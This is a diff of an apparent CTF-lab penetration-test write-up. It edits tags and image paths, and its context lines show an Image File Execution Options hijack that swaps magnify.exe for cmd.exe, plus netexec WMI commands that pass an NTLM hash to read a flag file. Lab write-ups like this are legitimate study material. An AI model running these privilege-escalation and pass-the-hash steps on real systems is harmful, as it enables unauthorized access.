@@ -6,8 +6,8 @@ date: "2025-08-11T16:47:31"
 lastmod: "2025-08-11T16:47:31"
 image: ""
 license: ""
-categories: ["春秋云镜"]
-tags: ["Pentest"]
+categories: ["offensive-security"]
+tags: ["春秋云镜"]
 ---
 ## flag1
 
@@ -41,7 +41,7 @@ rem 暂停以查看输出
 pause
 ```
 
-![image](./assets/001.webp)
+![image](./assets/001.png)
 
 链接之后激活组件，执行命令
 
@@ -214,7 +214,7 @@ RDP上去查看注册表
 Get-Acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
 ```
 
-![image](./assets/010.webp)
+![image](./assets/010.png)
 
 所有正常登录的用户都有权限修改注册表，修改注册表映像劫持，把本来用户主页点放大镜启动的`magnify.exe`替换成`C:\windows\system32\cmd.exe`
 
@@ -266,4 +266,3 @@ netexec wmi 172.22.8.15 -u WIN2016$ -H d3048f817ff9098184db91ef77f2d76e -d xiaor
 
 netexec wmi 172.22.8.15 -u WIN2016$ -H d3048f817ff9098184db91ef77f2d76e -d xiaorang -x "type C:\Users\Administrator\flag\flag03.txt"
 ```
-
